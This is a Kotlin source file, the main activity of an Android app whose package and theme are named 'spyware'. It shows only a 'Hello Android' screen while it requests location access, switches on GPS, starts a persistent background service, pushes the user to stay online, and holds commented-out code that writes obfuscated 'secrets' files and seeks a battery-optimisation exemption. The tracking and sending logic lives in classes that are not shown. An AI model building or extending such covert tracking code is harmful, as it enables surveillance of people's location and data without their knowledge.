package com.example.spyware

import android.app.AlertDialog
import android.content.Context
import android.content.Intent
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.os.Environment
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.ui.Modifier
import androidx.compose.ui.tooling.preview.Preview
import com.example.spyware.ui.theme.SpywareTheme
import android.provider.Settings
import appendShiftedToFile
import log
import org.json.JSONObject

class MainActivity : ComponentActivity() {
    private var mobileDialogOpen=false
    private lateinit var gpsReader: GpsReader;

    override fun onCreate(savedInstanceState: Bundle?) {
        println("Created MainActivity")
        log(this,JSONObject().put("message","MainActivity started"))
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        setContent {
            SpywareTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    Greeting(
                        name = "Android",
                        modifier = Modifier.padding(innerPadding)
                    )
                }
            }
        }

        gpsReader=GpsReader(this)
        gpsReader.grantLocationPermission(this)
        gpsReader.turnOnLocation(this)


//        appendShiftedToFile(this.filesDir,"secrets.txt","hello world",4)
//        appendShiftedToFile(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),"23423424.txt","hello world",4)
//        log(this, JSONObject().put("hello","world"))

//        val intent = Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
//        startActivity(intent)
        if(!MainService.isServiceActive) {
            this.startForegroundService(
                Intent(
                    this,
                    MainService::class.java
                )
            );
        }
    }

    override fun onResume() {
        println("Resumed MainActivity")
        super.onResume()
        showEnableInternetDialog(this)
    }

        // Step 4: Handle result of user's decision

    fun showEnableInternetDialog(context: Context) {
        if(!isConnectedToInternet(context) && mobileDialogOpen==false) {
            log(context,JSONObject().put("error","Not connected to internet."))
            mobileDialogOpen=true
            var dialog=AlertDialog.Builder(context)
                .setTitle("Enable internet access")
                .setMessage("Make sure you are connected to internet")
                .setPositiveButton("Open Settings") { _, _ ->
                    val intent = Intent(Settings.ACTION_WIRELESS_SETTINGS)
                    this.startActivity(intent)
                }
                .show()

            dialog.setOnDismissListener {
                mobileDialogOpen=false
//                showEnableMobileDataDialog(context)
            }
        }
    }

    fun isConnectedToInternet(context: Context): Boolean {
        val connectivityManager = context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val network = connectivityManager.activeNetwork ?: return false
            val capabilities = connectivityManager.getNetworkCapabilities(network) ?: return false
            return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                    capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
        } else {
            val networkInfo = connectivityManager.activeNetworkInfo
            return networkInfo != null && networkInfo.isConnected
        }
    }
}

@Composable
fun Greeting(name: String, modifier: Modifier = Modifier) {
    Text(
        text = "Hello $name!",
        modifier = modifier
    )
}

@Preview(showBackground = true)
@Composable
fun GreetingPreview() {
    SpywareTheme {
        Greeting("Android")
    }

}